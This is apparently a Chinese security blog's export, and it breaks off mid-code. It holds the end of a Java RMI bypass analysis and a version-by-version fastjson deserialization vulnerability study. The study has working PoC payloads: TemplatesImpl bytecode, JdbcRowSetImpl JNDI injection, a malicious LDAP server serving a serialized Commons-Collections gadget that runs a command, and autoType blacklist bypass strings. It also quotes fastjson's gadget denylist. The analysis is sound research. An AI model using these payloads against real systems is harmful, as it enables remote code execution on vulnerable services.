<li><code>sun.rmi.transport.DGCImpl_Stub#dirty</code>提前了黑名单<br>这是针对在JRMP触发链获取到JRMP服务器之后的一个黑名单拦截修复。<br>但是看看上面利用成功调用栈，会发现这个调用栈压根不走DGC层的dirty，而是直接调用了ref的invoke，相当于绕过了之前触发链的黑名单拦截。</li>
</ol>
<h3 id="8u241的修复第一处"><a href="#8u241的修复第一处" class="headerlink" title="8u241的修复第一处"></a>8u241的修复第一处</h3><p>在8u241版本，针对这个绕过链进行了修复：修复说明在<a href="https://www.oracle.com/technetwork/java/javase/8u241-relnotes-5813177.html#JDK-8230967">Oracle官网也有说明</a></p>
<p>重点就是把应该是String的地方从本来的<code>(String)var9.readobject()</code>改成了<br><code>SharedSecrets.getJavaObjectInputStreamReadString().readString(var9);</code>前者是可以反序列化Object的，但是后者就完全不接受反序列化Object。</p>
<p>为什么不接受反序列化Object呢，调试跟进看readString里面：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private String readString() throws IOException &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        return (String) readObject(String.class);//进入此处</span><br><span class="line">    &#125; catch (ClassNotFoundException cnf) &#123;</span><br><span class="line">        throw new IllegalStateException(cnf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>调用了<code>java.io.ObjectInputStream#readObject(java.lang.Class&lt;?&gt;)</code>，这个readString进来的接口跟我们平时调用readObject不一样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//平时调用的</span><br><span class="line">public final Object readObject()</span><br><span class="line">    throws IOException, ClassNotFoundException &#123;</span><br><span class="line">    return readObject(Object.class);//我们平常会进入此处</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>readObject(Object.class);</code>与<code>readObject(String.class);</code></p>
<p>在<code>java.io.ObjectInputStream#readObject(type)</code>会进行一些无关竟要的操作然后传递type<br>进入<code>java.io.ObjectInputStream#readObject0(type)</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//8u241时这里，type传入String</span><br><span class="line">private Object readObject0(Class&lt;?&gt; type, boolean unshared) throws IOException &#123;</span><br><span class="line">    //...</span><br><span class="line">    case TC_OBJECT://我们输入的payload对象是一个Object</span><br><span class="line">        if (type == String.class) &#123;</span><br><span class="line">            //8u241 type=String 直接在此处报错不进行反序列化了</span><br><span class="line">        throw new ClassCastException(&quot;Cannot cast an object to java.lang.String&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        //之前的版本都是传入type=Object于是正常反序列化</span><br><span class="line">        return checkResolve(readOrdinaryObject(unshared));</span><br><span class="line">    //..</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>所以在8u241中，如果参数应该是String的反序列化点就直接拒绝了Object的反序列化，杜绝了我们的上面的Gadgets。</p>
<h3 id="8u241的修复第二处"><a href="#8u241的修复第二处" class="headerlink" title="8u241的修复第二处"></a>8u241的修复第二处</h3><p>8u241还修复了调用栈中的<code>java.rmi.server.RemoteObjectInvocationHandler#invokeRemoteMethod</code>方法。</p>
<p>添加了一处针对传入method的验证。</p>
<p><img src="/images/20230430170309.png"></p>
<p>这个的method是从<code>sun.rmi.transport.tcp.TCPEndpoint#newServerSocket</code>的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ServerSocket var2 = ((RMIServerSocketFactory)var1).createServerSocket(this.listenPort);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>由于动态代理特性过来的，method就是createServerSocket这个方法，然而它理所当然不是一个remote接口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public interface RMIServerSocketFactory &#123;</span><br><span class="line"></span><br><span class="line">    public ServerSocket createServerSocket(int port)</span><br><span class="line">        throws IOException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>###最后借用大佬的图总结</p>
<p><img src="/images/20230430172816.png"></p>
]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>java安全</tag>
        <tag>RMI</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson全版本漏洞分析</title>
    <url>/2023/05/03/fastjson/</url>
    <content><![CDATA[<h1 id="fastjson分析"><a href="#fastjson分析" class="headerlink" title="fastjson分析"></a>fastjson分析</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>fastjson 是阿里巴巴的开源 JSON 解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。<br>由于其特点是快，以性能为优势快速占领了大量用户，并且其 API 十分简洁，用户量十分庞大，这也就导致了这样的组件一旦爆出漏洞，危害也将会是巨大的，因此，fastjson 从第一次报告安全漏洞至今，进行了若干次的安全更新，也与安全研究人员进行了来来回回多次的安全补丁-绕过的流程。本文随是一篇漏洞学习水文，但胜在记录详细，并将会持续进行更新。</p>
<h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><pre><code>//序列化
String text = JSON.toJSONString(obj); 
//反序列化
VO vo = JSON.parse(); //解析为JSONObject类型或者JSONArray类型
VO vo = JSON.parseObject(&quot;&#123;...&#125;&quot;); //JSON文本解析成JSONObject类型
VO vo = JSON.parseObject(&quot;&#123;...&#125;&quot;, VO.class); //JSON文本解析成VO.class类
</code></pre>
<p>示例：</p>
<pre><code>public class FastjsonDemo &#123;

    public static void main(String[] args) &#123;
        User user = new User();
        user.setAge(18);
        user.setName(&quot;test&quot;);

        String s1 = JSON.toJSONString(user);
        System.out.println(s1);

        String s2 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
        System.out.println(s2);

        Object o1 = JSON.parse(s2);
        System.out.println(o1);

        JSONObject jsonObject = JSON.parseObject(s2);
        System.out.println(jsonObject);

        User user1 = JSON.parseObject(s2, User.class);
        System.out.println(user1);
    &#125;
&#125;
</code></pre>
<p>返回：</p>
<pre><code>&#123;&quot;age&quot;:18,&quot;name&quot;:&quot;test&quot;&#125;
&#123;&quot;@type&quot;:&quot;com.study.fastjson.User&quot;,&quot;age&quot;:18,&quot;name&quot;:&quot;test&quot;&#125;
User&#123;name=&#39;test&#39;, age=18&#125;
Disconnected from the target VM, address: &#39;127.0.0.1:5478&#39;, transport: &#39;socket&#39;
&#123;&quot;name&quot;:&quot;test&quot;,&quot;age&quot;:18&#125;
User&#123;name=&#39;test&#39;, age=18&#125;
</code></pre>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>从fastjson-1.2.24的TemplatesImpl链分析：</p>
<p>在 JSON 类的 parse 方法最后是实例化了一个 <code>DefaultJSONParser</code> 对象又调用了其 <code>parse()</code> 方法</p>
<p><img src="/images/20230505224529.png"></p>
<p><code>parse()</code> 方法中，会根据this.lexer.token()的值去对应的case</p>
<p><img src="/images/20230505224654.png"></p>
<p>这个 lexer 属性实际上是在 DefaultJSONParser 对象被实例化的时候创建的，当传入的字符串第一个字符为 <code>&#39;&#123;&#39;</code> 就为12</p>
<p><img src="/images/20230505224814.png"></p>
<p>进入对应的case，先new 了一个 JSONObject 对象<br>然后调用 <code>DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code> 方法去解析</p>
<p><img src="/images/20230505225406.png"></p>
<p>将传入的json字符串不断往后取，当<code>key == JSON.DEFAULT_TYPE_KEY</code> 去判断取出来的键是否和<code>JSON.DEFAULT_TYPE_KEY</code>相等，接着又取出了 @type 的值，交给<code>TypeUtils.loadClass</code> 方法获取Class对象</p>
<p><img src="/images/20230505225350.png"></p>
<p>在<code>TypeUtils#loadClass</code>方法中，会判断<code>[</code>开头或<code>L</code>开头且<code>;</code>结尾，会直接return(这是下面两个版本的绕过的原因)，并且放到mappings缓存起来</p>
<p><img src="/images/20230505230134.png"></p>
<p>回到<code>DefaultJSONParser#parseObject</code>，<code>config.getDeserializer(clazz);</code> 这一段最终通过 <code>createJavaBeanDeserializer</code> 方法得到 ObjectDeserializer 对象</p>
<p><img src="/images/20230505231013.png"></p>
<p><code>createJavaBeanDeserializer</code> 方法中，主要通过<code>JavaBeanInfo.build</code>方法获取符合条件的 getter&#x2F;setter 方法，条件如下</p>
<ul>
<li>其中 getter 方法需满足条件：<ul>
<li>方法名长于 4</li>
<li>不是静态方法</li>
<li>以 <code>get</code> 开头且第4位是大写字母</li>
<li>方法不能有参数传入</li>
<li>返回值继承自 <code>Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong</code></li>
<li>此属性没有 setter 方法</li>
</ul>
</li>
<li>setter 方法需满足条件：<ul>
<li>方法名长于 4</li>
<li>以 <code>set</code> 开头且第4位是大写字母 </li>
<li>非静态方法</li>
<li>返回类型为 void 或当前类</li>
<li>参数个数为 1 个</li>
</ul>
</li>
</ul>
<p><code>JavaBeanInfo.build</code>方法将这些满足条件的方法最后保存在<code>fieldList</code>,封装成<code>JavaBeanInfo对象</code>，<code>JavaBeanInfo对象</code>封装到<code>JavaBeanDeserializer对象</code></p>
<p><img src="/images/20230505232321.png"><br><img src="/images/20230505232232.png"><br><img src="/images/20230505232554.png"></p>
<p>然后调用<code>JavaBeanDeserializer.deserialze</code>去反序列化属性，具体的流程是：</p>
<ol>
<li>先遍历我们传入的json字符串中的key去找到对应的getter&#x2F;setter方法，没有找到的话，会new DefaultFieldDeserializer，对属性赋值<br><img src="/images/20230505233302.png"></li>
<li>利用反射调用对应的getter&#x2F;setter方法将value赋值&#x2F;获取属性<br><img src="/images/20230505233415.png"><br>反射调用链如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;init&gt;:13, Test (json)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">setValue:85, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br></pre></td></tr></table></figure></li>
</ol>
<p>如果是byte[]类型的属性会调用<code>JSONScanner#bytesValue</code>，其中会调用<code>IOUtils.decodeBase64</code>进行base64解码</p>
<h1 id="fastjson-1-2-24"><a href="#fastjson-1-2-24" class="headerlink" title="fastjson-1.2.24"></a>fastjson-1.2.24</h1><h2 id="TemplatesImpl-反序列化"><a href="#TemplatesImpl-反序列化" class="headerlink" title="TemplatesImpl 反序列化"></a>TemplatesImpl 反序列化</h2><p>TemplatesImpl在CC链研究的时候分析过，这里不再追了，CC链直接用的是<code>newTransformer</code>作为入口，而这里用<code>getOutputProperties</code>作为入口，因为fastjson会调用getter&#x2F;setter方法，而 <code>getOutputProperties() </code>方法就是类成员变量 <code>_outputProperties</code> 的 <code>getter</code> 方法。同样会触发<code>newTransformer()</code></p>
<h3 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h3><pre><code>public class FastJson &#123;

    public static String readClass(String cls)&#123;
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try &#123;
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        &#125; catch (IOException e) &#123;
            e.printStackTrace();
        &#125;
        return Base64.encodeBase64String(bos.toByteArray());

    &#125;

    public static void main(String[] args) throws Exception &#123;

        ParserConfig config = new ParserConfig();
        final String evilClassPath = System.getProperty(&quot;user.dir&quot;) + &quot;\\target\\classes\\json\\Test.class&quot;;
        String evilCode = readClass(evilClassPath);
        final String NASTY_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;
        String text1 = &quot;&#123;\&quot;@type\&quot;:\&quot;&quot; + NASTY_CLASS +
                &quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+evilCode+&quot;\&quot;],&quot; +
                &quot;&#39;_name&#39;:&#39;a.b&#39;,&quot; +
                &quot;&#39;_tfactory&#39;:&#123; &#125;,&quot; +
                &quot;\&quot;_outputProperties\&quot;:&#123; &#125;&#125;\n&quot;;
        System.out.println(text1);
        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);

    &#125;

&#125;
</code></pre>
<h2 id="JdbcRowSetImpl-反序列化"><a href="#JdbcRowSetImpl-反序列化" class="headerlink" title="JdbcRowSetImpl 反序列化"></a>JdbcRowSetImpl 反序列化</h2><p>这条链本质就是<code>javax.naming.InitialContext#lookup()</code> 参数可控导致的 JNDI 注入。</p>
<p>先看看payload：</p>
<pre><code>&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
&quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:1234/a&quot;,
&quot;autoCommit&quot;:true&#125;
</code></pre>
<p>实际上：</p>
<ol>
<li>首先指定了该对象要反序列化的类为 com.sun.rowset.JdbcRowSetImpl</li>
<li>设定属性 dataSourceName ldap:&#x2F;&#x2F;127.0.0.1:1234&#x2F;a ，实际上是在调用 setDataSourceName 方法</li>
<li>设定 autoCommit 属性为 true，实际上也是在调用其 setter 方法</li>
</ol>
<p>调用<code>setAutoCommit</code>，当conn为空时，会调用 <code>this.connect()</code></p>
<p><img src="/images/20230506204020.png"></p>
<p><code>this.connect()</code>中存在JNDI连接，且<code>this.getDataSourceName()</code>可控，是<code>dataSourceName</code>属性的getter方法，导致JNDI注入</p>
<p><img src="/images/20230506204207.png"></p>
<h3 id="示例：-1"><a href="#示例：-1" class="headerlink" title="示例："></a>示例：</h3><p>这里我构造了一个恶意LDAP服务绑定恶意序列化数据</p>
<pre><code>public class LDAPServerBypass &#123;
    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;


    public static void main (String[] args) &#123;

        int port = 1234;


        try &#123;
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    &quot;listen&quot;,
                    InetAddress.getByName(&quot;0.0.0.0&quot;),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor());
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port);
            ds.startListening();

        &#125;
        catch ( Exception e ) &#123;
            e.printStackTrace();
        &#125;
    &#125;

    private static class OperationInterceptor extends InMemoryOperationInterceptor &#123;

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123;
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try &#123;
                e.addAttribute(&quot;javaClassName&quot;, &quot;test&quot;);
                e.addAttribute(&quot;javaSerializedData&quot;, Base64.decode(&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRv&quot; +
                        &quot;cmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznB&quot; +
                        &quot;H9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4&quot; +
                        &quot;cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSC&quot; +
                        &quot;nnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5z&quot; +
                        &quot;Zm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFp&quot; +
                        &quot;bmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUv&quot; +
                        &quot;Y29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9u&quot; +
                        &quot;cy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hl&quot; +
                        &quot;LmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGU&quot; +
                        &quot;AgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBz&quot; +
                        &quot;cgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zv&quot; +
                        &quot;cm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5h&quot; +
                        &quot;bWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNz&quot; +
                        &quot;O3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1&quot; +
                        &quot;cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsA&quot; +
                        &quot;AAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAA&quot; +
                        &quot;AnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAA&quot; +
                        &quot;AAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAA&quot; +
                        &quot;AAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdl&quot; +
                        &quot;chLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAB&quot; +
                        &quot;c3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xk&quot; +
                        &quot;eHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=&quot;));
                result.sendSearchEntry(e);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            &#125;
            catch ( Exception e1 ) &#123;
                e1.printStackTrace();
            &#125;
        &#125;
    &#125;
&#125;
</code></pre>
<p>受害者客户端：</p>
<pre><code>public class FastJson_JDBC &#123;
    public static void main(String[] args) &#123;
        ParserConfig config = new ParserConfig();
        String text1 = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1234/a\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;;
        System.out.println(text1);
        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
    &#125;
&#125;
</code></pre>
<h1 id="fastjson-1-2-25"><a href="#fastjson-1-2-25" class="headerlink" title="fastjson-1.2.25"></a>fastjson-1.2.25</h1><p>在版本 1.2.25 中，官方对之前的反序列化漏洞进行了修复，引入了 checkAutoType 安全机制，默认情况下 autoTypeSupport 关闭，无法加载@type的class对象，方法都封装在<code>com.alibaba.fastjson.parser.ParserConfig</code>中</p>
<p>开启<code>autoTypeSupport</code>：</p>
<pre><code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
</code></pre>
<p>添加反序列化白名单有3种方法：</p>
<ol>
<li>使用代码进行添加：ParserConfig.getGlobalInstance().addAccept(“com.study”)</li>
<li>加上JVM启动参数：-Dfastjson.parser.autoTypeAccept&#x3D;com.study</li>
<li>在fastjson.properties中添加：fastjson.parser.autoTypeAccept&#x3D;com.study</li>
</ol>
<p>可以看到几个成员变量，denyList是黑名单，acceptList 是反序列化白名单。</p>
<pre><code>private boolean                                         autoTypeSupport = AUTO_SUPPORT;
private String[]                                        denyList        = &quot;bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework&quot;.split(&quot;,&quot;);
private String[]                                        acceptList      = AUTO_TYPE_ACCEPT_LIST;
</code></pre>
<p>1.2.25替换<code>TypeUtils#loadClass</code>为<code>ParserConfig#checkAutoType</code>在反序列化前会做检查，如果开启了 <code>autoType</code>，先判断类名是否在白名单中，如果在，就使用 <code>TypeUtils.loadClass</code> 加载，然后使用黑名单判断类名的开头，如果匹配就抛出异常。</p>
<p><img src="/images/20230506211716.png"></p>
<p>如果没开启 <code>autoType</code> ，则是先使用黑名单匹配，再使用白名单匹配和加载。最后，如果要反序列化的类和黑白名单都未匹配时，只有开启了 <code>autoType</code> 或者 <code>expectClass</code> 不为空也就是指定了 Class 对象时才会调用 <code>TypeUtils.loadClass</code> 加载。</p>
<p><img src="/images/20230506211507.png"></p>
<p>所以，不开启<code>autoType</code>只会加载白名单里中不在黑名单的类，开启 <code>autoType</code>会加载白名单和黑名单外的类。</p>
<p>接着跟一下 <code>loadClass</code> ，这个类在加载目标类之前为了兼容带有描述符的类名，使用了递归调用来处理描述符中的 <code>[</code>、<code>L</code>、<code>;</code> 字符，之前分析里也有提到过。</p>
<p><img src="/images/20230505230134.png"></p>
<p>最终的 payload 其实就是在之前的 payload 类名上前后加上<code>L</code>和<code>;</code>即可：</p>
<pre><code>&#123;
&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,
&quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:1234/a&quot;,
&quot;autoCommit&quot;:true
&#125;
</code></pre>
<h1 id="fastjson-1-2-42"><a href="#fastjson-1-2-42" class="headerlink" title="fastjson-1.2.42"></a>fastjson-1.2.42</h1><p>在版本 1.2.42 中，fastjson 继续延续了黑白名单的检测模式，但是将黑名单类从白名单修改为使用 HASH 的方式进行对比，这是为了防止安全研究人员根据黑名单中的类进行反向研究，用来对未更新的历史版本进行攻击。同时，作者对之前版本一直存在的使用类描述符绕过黑名单校验的问题尝试进行了修复。</p>
<blockquote>
<p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.42</code>  </p>
</blockquote>
<p><code>com.alibaba.fastjson.parser.ParserConfig</code> 中，将原本的明文黑名单转为使用了 Hash 黑名单，防止安全人员对其研究。</p>
<pre><code>this.denyHashCodes = new long[]&#123;-8720046426850100497L, -8109300701639721088L, -7966123100503199569L, -7766605818834748097L, -6835437086156813536L, -4837536971810737970L, -4082057040235125754L, -2364987994247679115L, -1872417015366588117L, -254670111376247151L, -190281065685395680L, 33238344207745342L, 313864100207897507L, 1203232727967308606L, 1502845958873959152L, 3547627781654598988L, 3730752432285826863L, 3794316665763266033L, 4147696707147271408L, 5347909877633654828L, 5450448828334921485L, 5751393439502795295L, 5944107969236155580L, 6742705432718011780L, 7179336928365889465L, 7442624256860549330L, 8838294710098435315L&#125;;
</code></pre>
<p>并且在 checkAutoType 中加入判断，如果类的第一个字符是 L 结尾是 ;，则使用 substring进行了去除。</p>
<p><img src="/images/20230506213420.png"></p>
<p>在最后处理时是递归处理，因此只要对描述符进行双写即可绕过：</p>
<pre><code>&quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;
</code></pre>
<h1 id="fastjson-1-2-43"><a href="#fastjson-1-2-43" class="headerlink" title="fastjson-1.2.43"></a>fastjson-1.2.43</h1><p>修复了双写绕过</p>
<blockquote>
<p>影响版本：1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.43</p>
</blockquote>
<p>如果类名连续出现了两个 L 将会抛出异常</p>
<p><img src="/images/20230506213519.png"></p>
<p>但是漏了<code>[</code></p>
<p>利用时发现，普通的进行拼接会报错，需要再payload后面再加个<code>[</code>修改token来绕过这个报错</p>
<pre><code>&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[,
</code></pre>
<p><img src="/images/20230506223310.png"></p>
<p>但是这时依旧是数组的处理逻辑，但是我们没有]去闭合，需要将token设置为JSONToken.LBRACE跳出这个逻辑，逻辑在<code>JavaBeanDeserializer#deserialze</code>中:</p>
<pre><code>if (token != JSONToken.LBRACE &amp;&amp; token != JSONToken.COMMA) &#123;
    if (token == JSONToken.LITERAL_STRING) &#123;
        String strVal = lexer.stringVal();
        if (strVal.length() == 0) &#123;
            lexer.nextToken();
            return null;
        &#125;
        ...
    &#125;
    if (token == JSONToken.LBRACKET &amp;&amp; lexer.getCurrent() == &#39;]&#39;) &#123;
                lexer.next();
                lexer.nextToken();
                return null;
            &#125;

StringBuffer buf = (new StringBuffer()) //
                                .append(&quot;syntax error, expect &#123;, actual &quot;) //
                                .append(lexer.tokenName()) //
                                .append(&quot;, pos &quot;) //
                                .append(lexer.pos());

if (fieldName instanceof String) &#123;
                    buf //
                        .append(&quot;, fieldName &quot;) //
                        .append(fieldName);
                &#125;

                buf.append(&quot;, fastjson-version &quot;).append(JSON.VERSION);
                
                throw new JSONException(buf.toString());
            &#125;
</code></pre>
<p>修改token的逻辑在DefaultJSONParser#parseArray 687行或696行</p>
<p><img src="/images/20230506230627.png"></p>
<p>因为<code>while (lexer.token() == JSONToken.COMMA)</code>，会不断跳过逗号（JSONToken.COMMA就是逗号的token），所以不能将token设置为JSONToken.COMMA来绕过if，只能考虑将token设置为JSONToken.LBRACE，使用第一个nextToken来设置token</p>
<pre><code>&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1234/a\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;
</code></pre>
<p><img src="/images/20230506231133.png"></p>
<p>使用第二个nextToken来设置token</p>
<pre><code>&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[,&#123;\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1234/a\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;
</code></pre>
<p><img src="/images/20230506231245.png"></p>
<p>所以<code>[</code>和<code>&#123;</code>之间不管有多少个<code>,</code>都不会影响payload的执行，因为<code>while (lexer.token() == JSONToken.COMMA)</code></p>
<p>最后总结payload:</p>
<pre><code>&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[,,,,,,&#123;\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1234/a\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;
</code></pre>
<h1 id="fastjson-1-2-45"><a href="#fastjson-1-2-45" class="headerlink" title="fastjson-1.2.45"></a>fastjson-1.2.45</h1><p>黑名单绕过, jackson 都是明文黑名单的，fastjson Hash黑名单其实无意义</p>
<blockquote>
<p>影响版本：1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.45</p>
</blockquote>
<p>payload:</p>
<pre><code>&#123;
    &quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,
    &quot;properties&quot;:&#123;
        &quot;data_source&quot;:&quot;ldap://127.0.0.1:1234/a&quot;
    &#125;
&#125;
</code></pre>
<h1 id="fastjson-1-2-47"><a href="#fastjson-1-2-47" class="headerlink" title="fastjson-1.2.47"></a>fastjson-1.2.47</h1><p>可以在不开启 AutoTypeSupport 的情况下进行反序列化的利用。</p>
<blockquote>
<p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.32 未开启 AutoTypeSupport</code><br>影响版本：<code>1.2.33 &lt;= fastjson &lt;= 1.2.47</code>  </p>
</blockquote>
<p>看到<code>checkAutoType() </code>方法</p>
<pre><code>public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) &#123;
    // 类名非空判断
    if (typeName == null) &#123;
        return null;
    &#125;
    // 类名长度判断，不大于128不小于3
    if (typeName.length() &gt;= 128 || typeName.length() &lt; 3) &#123;
        throw new JSONException(&quot;autoType is not support. &quot; + typeName);
    &#125;

    String className = typeName.replace(&#39;$&#39;, &#39;.&#39;);
    Class&lt;?&gt; clazz = null;

    final long BASIC = 0xcbf29ce484222325L; //;
    final long PRIME = 0x100000001b3L;  //L

    final long h1 = (BASIC ^ className.charAt(0)) * PRIME;
    // 类名以 [ 开头抛出异常
    if (h1 == 0xaf64164c86024f1aL) &#123; // [
        throw new JSONException(&quot;autoType is not support. &quot; + typeName);
    &#125;
    // 类名以 L 开头以 ; 结尾抛出异常
    if ((h1 ^ className.charAt(className.length() - 1)) * PRIME == 0x9198507b5af98f0L) &#123;
        throw new JSONException(&quot;autoType is not support. &quot; + typeName);
    &#125;

    final long h3 = (((((BASIC ^ className.charAt(0))
            * PRIME)
            ^ className.charAt(1))
            * PRIME)
            ^ className.charAt(2))
            * PRIME;
    // autoTypeSupport 为 true 时，先对比 acceptHashCodes 加载白名单项
    if (autoTypeSupport || expectClass != null) &#123;
        long hash = h3;
        for (int i = 3; i &lt; className.length(); ++i) &#123;
            hash ^= className.charAt(i);
            hash *= PRIME;
